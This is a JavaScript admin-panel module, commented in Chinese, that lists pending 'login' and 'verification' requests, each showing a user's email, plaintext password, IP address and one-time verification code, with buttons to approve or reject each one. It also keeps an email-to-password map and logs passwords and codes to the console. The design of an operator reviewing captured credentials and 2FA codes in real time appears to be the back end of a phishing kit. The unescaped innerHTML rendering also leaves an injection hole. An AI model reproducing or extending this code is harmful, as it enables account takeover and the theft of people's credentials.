/**
 * 审核功能模块
 * 包含登录请求和验证请求的加载、显示、审核等功能
 */

// 扩展 AdminApp 类
(function () {
    // 加载登录请求
    AdminApp.prototype.loadLoginRequests = async function () {
        try {
            const response = await this.apiRequest('/api/admin/login-requests');
            if (response && response.ok) {
                const requests = await response.json();
                this.displayLoginRequests(requests);
            }
        } catch (error) {
            console.error('加载登录请求错误:', error);
        }
    };

    // 显示登录请求
    AdminApp.prototype.displayLoginRequests = function (requests) {
        const container = document.getElementById('loginRequestsList');

        if (requests.length === 0) {
            container.innerHTML = '<p>暂无待审核的登录请求</p>';
            return;
        }

        // 添加调试日志
        console.log('显示登录请求数据:', requests);
        if (requests.length > 0) {
            console.log('第一个请求的密码字段:', requests[0].password);
        }

        container.innerHTML = requests.map(request => {
            console.log(`请求ID ${request.id} 的密码:`, request.password);
            return `
            <div class="request-item" data-id="${request.id}">
                <div class="request-header">
                    <div class="request-info">
                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                    </div>
                    <div class="request-actions">
                        <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
                        <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
                    </div>
                </div>
            </div>
            `;
        }).join('');
    };

    // 加载验证请求
    AdminApp.prototype.loadVerificationRequests = async function () {
        try {
            const response = await this.apiRequest('/api/admin/verification-requests');
            if (response && response.ok) {
                const requests = await response.json();
                console.log('从服务器获取的验证请求数据:', requests);
                if (requests.length > 0) {
                    console.log('第一个验证请求的完整数据:', requests[0]);
                    console.log('第一个验证请求的密码字段类型:', typeof requests[0].password);
                    console.log('第一个验证请求的密码字段值:', requests[0].password);
                }
                this.displayVerificationRequests(requests);
            }
        } catch (error) {
            console.error('加载验证请求错误:', error);
        }
    };

    // 显示验证请求
    AdminApp.prototype.displayVerificationRequests = function (requests) {
        const container = document.getElementById('verificationRequestsList');

        if (requests.length === 0) {
            container.innerHTML = '<p>暂无待审核的验证请求</p>';
            return;
        }

        // 添加调试日志
        console.log('显示验证请求数据:', requests);
        if (requests.length > 0) {
            console.log('第一个验证请求的密码字段:', requests[0].password);
            console.log('第一个验证请求的验证码:', requests[0].verification_code);
        }

        container.innerHTML = requests.map(request => {
            // 尝试从邮箱-密码映射中获取密码
            let password = request.password;
            if (!password && request.email && this.emailPasswordMap.has(request.email)) {
                password = this.emailPasswordMap.get(request.email);
                console.log(`从映射中获取到邮箱 ${request.email} 的密码`);
            }

            console.log(`验证请求ID ${request.id} 的密码:`, password);
            return `
            <div class="request-item" data-id="${request.id}">
                <div class="request-header">
                    <div class="request-info">
                        <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                    </div>
                    <div class="request-actions">
                        <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
                        <button class="reject-btn" onclick="adminApp.approveVerification(${request.id}, false)">拒绝</button>
                    </div>
                </div>
            </div>
            `;
        }).join('');
    };

    // 审核登录请求
    AdminApp.prototype.approveLogin = async function (id, approved) {
        try {
            const response = await this.apiRequest(`/api/admin/approve-login/${id}`, {
                method: 'POST',
                body: JSON.stringify({ approved })
            });

            if (response && response.ok) {
                // 移除已处理的请求
                const element = document.querySelector(`#loginRequestsList .request-item[data-id="${id}"]`);
                if (element) {
                    element.remove();
                }
                this.updatePendingCount();
            }
        } catch (error) {
            console.error('审核登录请求错误:', error);
        }
    };

    // 审核验证请求
    AdminApp.prototype.approveVerification = async function (id, approved) {
        try {
            const response = await this.apiRequest(`/api/admin/approve-verification/${id}`, {
                method: 'POST',
                body: JSON.stringify({ approved })
            });

            if (response && response.ok) {
                // 移除已处理的请求
                const element = document.querySelector(`#verificationRequestsList .request-item[data-id="${id}"]`);
                if (element) {
                    element.remove();
                }
                this.updatePendingCount();
            }
        } catch (error) {
            console.error('审核验证请求错误:', error);
        }
    };

    // 添加登录请求
    AdminApp.prototype.addLoginRequest = function (request) {
        const container = document.getElementById('loginRequestsList');
        const existingEmpty = container.querySelector('p');
        if (existingEmpty) {
            existingEmpty.remove();
        }

        // 存储邮箱和密码的映射，用于验证请求
        if (request.email && request.password) {
            console.log(`存储邮箱 ${request.email} 的密码映射`);
            this.emailPasswordMap.set(request.email, request.password);
        }

        const requestElement = document.createElement('div');
        requestElement.className = 'request-item';
        requestElement.dataset.id = request.id;
        requestElement.innerHTML = `
            <div class="request-header">
                <div class="request-info">
                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${request.password || '未获取到密码'}</strong> | IP: ${request.ip_address} | 时间: ${new Date(request.login_time).toLocaleString()}</h4>
                </div>
                <div class="request-actions">
                    <button class="approve-btn" onclick="adminApp.approveLogin(${request.id}, true)">通过</button>
                    <button class="reject-btn" onclick="adminApp.approveLogin(${request.id}, false)">拒绝</button>
                </div>
            </div>
        `;
        container.insertBefore(requestElement, container.firstChild);
    };

    // 添加验证请求
    AdminApp.prototype.addVerificationRequest = function (request) {
        const container = document.getElementById('verificationRequestsList');
        const existingEmpty = container.querySelector('p');
        if (existingEmpty) {
            existingEmpty.remove();
        }

        // 检查是否已经存在相同ID的请求，如果存在则不添加
        const existingRequest = document.querySelector(`#verificationRequestsList .request-item[data-id="${request.id}"]`);
        if (existingRequest) {
            console.log(`验证请求ID ${request.id} 已存在，不重复添加`);
            return;
        }

        // 尝试从服务器获取完整的验证请求数据，包括密码
        this.fetchVerificationRequestDetails(request.id)
            .then(fullRequest => {
                // 如果成功获取到完整数据，使用它来添加请求
                if (fullRequest && fullRequest.password) {
                    this.renderVerificationRequest(fullRequest);
                } else {
                    // 否则使用原始数据
                    this.renderVerificationRequest(request);
                }
            })
            .catch(error => {
                console.error(`获取验证请求 ${request.id} 详情失败:`, error);
                // 出错时使用原始数据
                this.renderVerificationRequest(request);
            });
    };

    // 从服务器获取完整的验证请求详情
    AdminApp.prototype.fetchVerificationRequestDetails = async function (id) {
        try {
            const response = await this.apiRequest(`/api/admin/verification-request/${id}`);
            if (response && response.ok) {
                const data = await response.json();
                console.log(`获取到验证请求 ${id} 的完整数据:`, data);
                return data;
            }
        } catch (error) {
            console.error(`获取验证请求 ${id} 详情错误:`, error);
        }
        return null;
    };

    // 渲染验证请求到UI
    AdminApp.prototype.renderVerificationRequest = function (request) {
        // 尝试从邮箱-密码映射中获取密码
        let password = request.password;
        if (!password && request.email && this.emailPasswordMap.has(request.email)) {
            password = this.emailPasswordMap.get(request.email);
            console.log(`从映射中获取到邮箱 ${request.email} 的密码`);
        }

        console.log(`渲染验证请求: ID=${request.id}, 邮箱=${request.email}, 密码=${password}, 验证码=${request.verification_code}`);

        const container = document.getElementById('verificationRequestsList');
        const requestElement = document.createElement('div');
        requestElement.className = 'request-item';
        requestElement.dataset.id = request.id;
        requestElement.innerHTML = `
            <div class="request-header">
                <div class="request-info">
                    <h4>${request.email} | 密码: <strong style="color: #0071e3; font-family: monospace;">${password || '未获取到密码'}</strong> | 验证码: <strong style="color: #34c759; font-family: monospace; font-size: 20px;">${request.verification_code}</strong> | 时间: ${new Date(request.submitted_at).toLocaleString()}</h4>
                </div>
                <div class="request-actions">
                    <button class="approve-btn" onclick="adminApp.approveVerification(${request.id}, true)">通过</button>
                    <button class="reject-btn" onclick="adminApp.approveVerification(${request.id}, false)">拒绝</button>
                </div>
            </div>
        `;
        container.insertBefore(requestElement, container.firstChild);
    };
})();